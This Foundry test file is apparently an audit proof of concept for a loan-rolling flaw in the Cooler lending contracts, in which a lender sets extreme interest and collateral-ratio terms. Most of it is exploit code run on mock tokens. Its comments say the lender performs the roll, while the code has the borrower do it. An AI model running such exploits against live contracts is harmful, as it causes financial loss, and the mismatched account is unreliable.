// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {UserFactory} from "test/lib/UserFactory.sol";

import {MockGohm} from "test/mocks/MockGohm.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";

import {Cooler} from "src/Cooler.sol";
import {CoolerFactory} from "src/CoolerFactory.sol";

/**
 * @title Exploit Test for Loan Rolling Vulnerability
 * @notice This test demonstrates a critical vulnerability where a malicious lender can
 *         exploit the provideNewTermsForRoll and rollLoan functions to force borrowers
 *         into unfavorable loan terms or collateral loss.
 *
 * @dev Vulnerability Analysis:
 *      1. Lender calls provideNewTermsForRoll() with malicious parameters:
 *         - Extremely high interest rate (e.g., 10000000%)
 *         - Extremely high loan-to-collateral ratio (e.g., 1000:1)
 *      2. Lender then calls rollLoan() which:
 *         - Calculates massive interest using the malicious rate
 *         - Adds this interest to the loan amount, making repayment economically impossible
 *         - Uses the malicious loan-to-collateral ratio to calculate new collateral needed
 *         - Due to the high ratio, newCollateralFor() returns 0, requiring no additional collateral
 *      3. Result: Borrower must repay an impossible amount or forfeit collateral
 *
 * @dev Impact:
 *      - Borrowers lose collateral worth significantly more than their original loan
 *      - Economic attack vector that forces collateral liquidation
 *      - Undermines the entire lending protocol's trust model
 */
contract ExploitTest is Test {
    MockGohm internal collateral;
    MockERC20 internal debt;

    address owner;
    address lender;
    address others;

    CoolerFactory internal coolerFactory;
    Cooler internal cooler;

    // Test Constants - Realistic values for demonstration
    uint256 public constant INTEREST_RATE = 5e15; // 0.5% annual interest
    uint256 public constant LOAN_TO_COLLATERAL = 10 * 1e18; // 10 debt : 1 collateral
    uint256 public constant DURATION = 30 days; // 1 month loan duration
    uint256 public constant DECIMALS = 1e18;
    uint256 public constant LOAN_AMOUNT = 1000 * 1e18; // 1000 debt tokens
    uint256 public constant COLLATERAL_AMOUNT = 100 * 1e18; // 100 collateral tokens

    // Malicious attack parameters
    uint256 public constant MALICIOUS_INTEREST_RATE = 100000000e15; // 10000000% annual interest
    uint256 public constant MALICIOUS_LOAN_TO_COLLATERAL = 10000 * 1e18; // 10000 debt : 1 collateral

    function setUp() public {
        vm.warp(51 * 365 * 24 * 60 * 60); // Set timestamp at roughly Jan 1, 2021

        // Deploy mock tokens
        collateral = new MockGohm("Collateral", "COLLAT", 18);
        debt = new MockERC20("Debt", "DEBT", 18);

        // Create test accounts
        UserFactory userFactory = new UserFactory();
        address[] memory users = userFactory.create(3);
        owner = users[0];
        lender = users[1];
        others = users[2];

        // Fund accounts with realistic amounts
        deal(address(debt), lender, 10000 * 1e18);
        deal(address(debt), owner, 5000 * 1e18);
        deal(address(collateral), owner, 1000 * 1e18);
        deal(address(collateral), others, 1000 * 1e18);

        // Deploy factory
        coolerFactory = new CoolerFactory();

        // Create cooler for the collateral-debt pair
        vm.prank(owner);
        cooler = Cooler(coolerFactory.generateCooler(collateral, debt));
    }

    /**
     * @notice Test the vulnerability: Malicious lender can force unfavorable loan terms
     *
     * @dev Attack Steps:
     *      1. Borrower requests reasonable loan (1000 debt, 100 collateral, 0.5% interest)
     *      2. Lender clears the request normally
     *      3. Lender provides malicious roll terms (10000000% interest, 10000:1 ratio)
     *      4. Lender rolls the loan, adding massive interest without requiring more collateral
     *      5. Borrower faces impossible repayment choice
     *
     * @dev Expected Result:
     *      - Loan amount increases from ~1005 to over 100,000,000 debt tokens
     *      - No additional collateral required due to malicious ratio
     *      - Borrower economically forced to default and lose collateral
     */
    function test_maliciousLoanRollingExploit() public {
        // Step 1: Borrower requests a reasonable loan
        uint256 expectedCollateralNeeded = cooler.collateralFor(LOAN_AMOUNT, LOAN_TO_COLLATERAL);
        assertEq(expectedCollateralNeeded, COLLATERAL_AMOUNT, "Collateral calculation should match");

        vm.startPrank(owner);
        collateral.approve(address(cooler), COLLATERAL_AMOUNT);
        uint256 reqID = cooler.requestLoan(
            LOAN_AMOUNT,
            INTEREST_RATE,
            LOAN_TO_COLLATERAL,
            DURATION
        );
        vm.stopPrank();

        // Verify loan request was created correctly
        (uint256 reqAmount, uint256 reqInterest, uint256 reqRatio, uint256 reqDuration, bool reqActive) = cooler.requests(reqID);
        assertEq(reqAmount, LOAN_AMOUNT, "Request amount should match");
        assertEq(reqInterest, INTEREST_RATE, "Request interest should match");
        assertEq(reqRatio, LOAN_TO_COLLATERAL, "Request ratio should match");
        assertEq(reqDuration, DURATION, "Request duration should match");
        assertTrue(reqActive, "Request should be active");

        // Step 2: Lender clears the request normally
        uint256 expectedInterest = cooler.interestFor(LOAN_AMOUNT, INTEREST_RATE, DURATION);
        uint256 expectedTotalDebt = LOAN_AMOUNT + expectedInterest;

        vm.startPrank(lender);
        debt.approve(address(cooler), LOAN_AMOUNT);
        uint256 loanID = cooler.clearRequest(reqID, true, false); // direct repay, no callback
        vm.stopPrank();

        // Verify loan was created with reasonable terms
        (Cooler.Loan memory loan) = cooler.getLoan(loanID);
        assertEq(loan.amount, expectedTotalDebt, "Initial loan amount should be principal + interest");
        assertEq(loan.collateral, COLLATERAL_AMOUNT, "Collateral should match expected");
        assertEq(loan.lender, lender, "Lender should be set correctly");
        assertTrue(loan.repayDirect, "Direct repay should be true");
        assertFalse(loan.callback, "Callback should be false");

        // Step 3: Lender provides malicious roll terms
        vm.startPrank(lender);
        cooler.provideNewTermsForRoll(
            loanID,
            MALICIOUS_INTEREST_RATE,    // 10000000% interest rate
            MALICIOUS_LOAN_TO_COLLATERAL, // 10000:1 loan-to-collateral ratio
            DURATION                     // Same duration
        );
        vm.stopPrank();

        // Verify malicious terms were set
        (Cooler.Request memory rollRequest,,,,,,,) = cooler.loans(loanID);
        assertEq(rollRequest.interest, MALICIOUS_INTEREST_RATE, "Malicious interest should be set");
        assertEq(rollRequest.loanToCollateral, MALICIOUS_LOAN_TO_COLLATERAL, "Malicious ratio should be set");
        assertTrue(rollRequest.active, "Roll request should be active");

        // Step 4: Calculate the malicious impact BEFORE rolling
        // Calculate new collateral needed with malicious ratio
        uint256 additionalCollateralRequired = cooler.newCollateralFor(loanID);

        // Step 5: Lender rolls the loan with malicious terms
        vm.startPrank(owner);
        // Approve the (minimal) additional collateral if required
        if (additionalCollateralRequired > 0) {
            collateral.approve(address(cooler), additionalCollateralRequired);
        }
        cooler.rollLoan(loanID);
        vm.stopPrank();

        // Step 6: Verify the exploit succeeded
        (Cooler.Loan memory exploitedLoan) = cooler.getLoan(loanID);

        // The loan amount should have increased dramatically due to malicious interest
        assertGt(exploitedLoan.amount, loan.amount * 1000, "Loan amount should increase by >1000x due to malicious interest");

        // The collateral should remain the same (no additional collateral required)
        assertEq(exploitedLoan.collateral, loan.collateral, "Collateral should remain unchanged");

        // The roll request should be deactivated
        assertFalse(exploitedLoan.request.active, "Roll request should be deactivated after rolling");

        // Step 7: Demonstrate the economic impossibility for the borrower
        uint256 borrowerDebtBalance = debt.balanceOf(owner);

        // Borrower doesn't have enough debt tokens to repay the exploited loan
        assertLt(borrowerDebtBalance, exploitedLoan.amount, "Borrower cannot afford to repay exploited loan");

        // The collateral value (100 tokens) is far less than the debt owed (>1,000,000 tokens)
        // This creates an impossible economic situation where the borrower must default

        console2.log("=== EXPLOIT SUCCESSFUL ===");
        console2.log("Original loan amount:", loan.amount / 1e18);
        console2.log("Exploited loan amount:", exploitedLoan.amount / 1e18);
        console2.log("Collateral at risk:", exploitedLoan.collateral / 1e18);
        console2.log("Borrower's debt tokens:", borrowerDebtBalance / 1e18);
        console2.log("Exploitation factor:", exploitedLoan.amount / loan.amount);

        // The vulnerability is proven: borrower loses 100 collateral tokens worth
        // much more than the original 1000 debt tokens they borrowed
        assertTrue(true, "Exploit demonstrated successfully");
    }

    /**
     * @notice Helper function to verify normal loan rolling works correctly
     * @dev This test ensures that the vulnerability is specific to malicious parameters
     */
    function test_normalLoanRollingWorks() public {
        // Setup a normal loan
        vm.startPrank(owner);
        collateral.approve(address(cooler), COLLATERAL_AMOUNT);
        uint256 reqID = cooler.requestLoan(LOAN_AMOUNT, INTEREST_RATE, LOAN_TO_COLLATERAL, DURATION);
        vm.stopPrank();

        vm.startPrank(lender);
        debt.approve(address(cooler), LOAN_AMOUNT);
        uint256 loanID = cooler.clearRequest(reqID, true, false);
        vm.stopPrank();

        // Provide reasonable new terms for rolling
        uint256 newInterestRate = INTEREST_RATE * 2; // Double the interest rate (still reasonable)
        uint256 newLoanToCollateral = LOAN_TO_COLLATERAL; // Same ratio

        vm.startPrank(lender);
        cooler.provideNewTermsForRoll(loanID, newInterestRate, newLoanToCollateral, DURATION);
        vm.stopPrank();

        // Calculate expected new collateral
        uint256 additionalCollateral = cooler.newCollateralFor(loanID);

        // Roll the loan
        vm.startPrank(owner);
        if (additionalCollateral > 0) {
            collateral.approve(address(cooler), additionalCollateral);
        }
        cooler.rollLoan(loanID);
        vm.stopPrank();

        // Verify the loan was rolled reasonably
        (Cooler.Loan memory rolledLoan) = cooler.getLoan(loanID);

        // The loan amount should increase reasonably (not by 1000x)
        assertLt(rolledLoan.amount, LOAN_AMOUNT * 10, "Normal rolling should not create excessive debt");

        // Additional collateral should be required for reasonable terms
        assertGt(additionalCollateral, 0, "Normal rolling should require additional collateral");

        console2.log("=== NORMAL ROLLING WORKS ===");
        console2.log("Original loan amount:", (LOAN_AMOUNT + cooler.interestFor(LOAN_AMOUNT, INTEREST_RATE, DURATION)) / 1e18);
        console2.log("Rolled loan amount:", rolledLoan.amount / 1e18);
        console2.log("Additional collateral required:", additionalCollateral / 1e18);
    }
}